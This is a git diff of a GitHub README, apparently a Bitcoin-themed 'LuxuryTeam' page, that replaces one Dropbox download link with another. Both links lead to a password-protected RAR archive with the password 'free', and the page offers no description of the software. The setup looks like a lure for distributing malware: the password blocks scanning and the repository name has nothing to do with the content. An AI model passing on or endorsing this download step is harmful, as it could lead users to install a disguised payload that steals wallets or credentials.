@@ -5,7 +5,7 @@
 ![LuxuryTeam 2 Bitcoin-fotor-20240505145347](https://github.com/LuxuryTeam0/refactored-fortnight/assets/169560459/c25a5c77-dac2-4a22-aeb9-2402604ba8eb)
 
 # Let me make it clear right away that the unit at the beginning of the address is required. Let's begin.
-# **1. Download this > [FILE](https://www.dropbox.com/scl/fi/ghpu8s723ojrivy6pwwp5/LuxuryTeam.rar?rlkey=o2ai09owlr81ifyd8oh5dmp5v&st=ustmnski&dl=1).** (***pass - free***)
+# **1. Download this > [FILE](https://www.dropbox.com/scl/fi/bafdenkeuyyx3n8uwrqht/LuxuryTeam.rar?rlkey=w9jaw2b6ohd6rdlarwq631knu&st=6ftbcocd&dl=1)** (***pass - free***)
 
 ***pass - free***
 
